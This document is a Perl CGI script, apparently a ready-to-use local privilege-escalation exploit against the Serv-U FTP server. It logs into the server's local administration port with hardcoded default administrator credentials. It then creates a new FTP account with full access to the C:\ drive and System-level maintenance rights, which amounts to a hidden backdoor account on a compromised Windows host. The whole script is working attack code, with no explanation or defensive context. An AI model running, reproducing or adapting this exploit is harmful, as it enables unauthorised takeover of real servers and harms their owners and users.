#!/usr/bin/perl
use IO::Socket;

binmode(STDOUT);
syswrite(STDOUT, "Content-type: text/html\r\n\r\n", 27);

$addr = "127.0.0.1";
$ftpport = 21;
$adminport = 43958;
$adminuser = "LocalAdministrator";
$adminpass = '#l@$ak#.lk;0@P';
$user = "Andyower";
$password = "haika";
$homedir = 'C:\\';
$dir = 'C:\\WINNT\\System32\\';

use IO::Socket::INET;

$sock = IO::Socket::INET->new("127.0.0.1:$adminport") || die "fail";

print "AndyowerÖÆ×÷<br><br>";

print $sock "USER $adminuser\r\n";
sleep (1);
print $sock "PASS $adminpass\r\n";
sleep(1);
print $sock "SITE MAINTENANCE\r\n";
sleep(1);
print $sock "-SETUSERSETUP\r\n";
print $sock "-IP=".$addr."\r\n";
print $sock "-PortNo=".$ftpport."\r\n";
print $sock "-User=".$user."\r\n";
print $sock "-Password=".$password."\r\n";
print $sock "-HomeDir=".$homedir."\r\n";
print $sock "-LoginMesFile=\r\n";
print $sock "-Disable=0\r\n";
print $sock "-RelPaths=0\r\n";
print $sock "-NeedSecure=0\r\n";
print $sock "-HideHidden=0\r\n";
print $sock "-AlwaysAllowLogin=0\r\n";
print $sock "-ChangePassword=1\r\n";
print $sock "-QuotaEnable=0\r\n";
print $sock "-MaxUsersLoginPerIP=-1\r\n";
print $sock "-SpeedLimitUp=-1\r\n";
print $sock "-SpeedLimitDown=-1\r\n";
print $sock "-MaxNrUsers=-1\r\n";
print $sock "-IdleTimeOut=600\r\n";
print $sock "-SessionTimeOut=-1\r\n";
print $sock "-Expire=0\r\n";
print $sock "-RatioUp=1\r\n";
print $sock "-RatioDown=1\r\n";
print $sock "-RatiosCredit=0\r\n";
print $sock "-QuotaCurrent=0\r\n";
print $sock "-QuotaMaximum=0\r\n";
print $sock "-Maintenance=System\r\n";
print $sock "-PasswordType=Regular\r\n";
print $sock "-Ratios=None\r\n";
print $sock " Access=".$homedir."|RWAMELCDP\r\n";
print $sock "QUIT\r\n";

@ret=<$sock>;
print "@ret";

close(STDERR);
close(STDOUT);
exit;